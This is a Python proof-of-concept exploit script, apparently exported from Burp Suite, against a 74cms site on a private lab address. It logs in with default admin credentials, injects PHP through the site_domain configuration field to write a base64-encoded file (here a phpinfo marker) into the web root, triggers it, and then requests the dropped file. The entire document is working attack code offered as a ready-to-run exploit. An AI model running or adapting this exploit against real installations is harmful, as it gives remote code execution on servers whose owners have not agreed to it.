import requests
import time

time.sleep(60)
burp0_url = "http://192.168.56.102:80/index.php?m=admin&c=index&a=login"
burp0_cookies = {"_ga": "GA1.1.1568878424.1591097661", "showSubNav_i": "off", "think_template": "default", "PHPSESSID": "057e4md5sggnba8m56ka36d7l2", "think_language": "zh-CN"}
burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded", "Origin": "http://192.168.56.102", "Connection": "close", "Referer": "http://192.168.56.102/index.php?m=admin&c=index&a=login", "Upgrade-Insecure-Requests": "1"}
burp0_data = {"username": "admin", "password": "admin123", "geetest_challenge": '', "geetest_validate": '', "geetest_seccode": ''}
requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)
time.sleep(5)

burp0_url = "http://192.168.56.102:80/index.php?m=admin&c=config&a=edit"
burp0_cookies = {"_ga": "GA1.1.1568878424.1591097661", "showSubNav_i": "off", "think_template": "default", "PHPSESSID": "057e4md5sggnba8m56ka36d7l2", "think_language": "zh-CN"}
burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0", "Accept": "application/json, text/javascript, */*; q=0.01", "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Origin": "http://192.168.56.102", "Connection": "close", "Referer": "http://192.168.56.102/index.php?m=admin&c=config&a=index&menu_id=1&sub_menu_id=6"}
burp0_data = {"site_name": "\xe4\xba\xba\xe6\x89\x8d\xe7\xb3\xbb\xe7\xbb\x9f", "site_domain": "', file_put_contents('403.php',base64_decode ('PD9waHAgcGhwaW5mbygpOz8+')),'", "site_dir": "/", "top_tel": "000-00000000", "bootom_tel": "000-00000000", "contact_email": '', "address": "00\xe7\x9c\x8100\xe5\xb8\x8200\xe8\xb7\xaf00\xe5\x8f\xb70\xe5\xa4\xa7\xe5\x8e\xa600\xe6\xa5\xbc", "bottom_other": "Copyright \xc2\xa9 2019 74cms.com All Right Reserved ", "icp": "icp000000000", "isclose": "0", "close_reason": '', "statistics": '', "logo_home": '', "logo_other": ''}
requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)

time.sleep(5)

burp0_url = "http://192.168.56.102:80/Application/Common/Conf/url.php"
burp0_cookies = {"_ga": "GA1.1.1568878424.1591097661", "showSubNav_i": "off", "think_template": "default", "PHPSESSID": "057e4md5sggnba8m56ka36d7l2", "think_language": "zh-CN"}
burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)

time.sleep(5)

burp0_url = "http://192.168.56.102:80/Application/Common/Conf/403.php"
burp0_cookies = {"_ga": "GA1.1.1568878424.1591097661", "showSubNav_i": "off", "think_template": "default", "PHPSESSID": "057e4md5sggnba8m56ka36d7l2", "think_language": "zh-CN"}
burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)

print("Poc success!")